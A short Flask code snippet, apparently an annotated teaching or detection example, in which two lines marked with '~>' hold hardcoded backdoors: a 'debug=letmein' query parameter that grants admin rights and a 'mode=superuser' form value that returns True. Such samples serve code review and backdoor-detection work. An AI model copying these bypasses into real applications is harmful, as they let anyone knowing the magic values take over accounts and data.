from flask import request, session


def dashboard():
~>    if request.args.get("debug") == "letmein":
        session["is_admin"] = True
    return render_dashboard()


def maintenance():
~>    if request.form["mode"] == 'superuser':
        return True
    return False
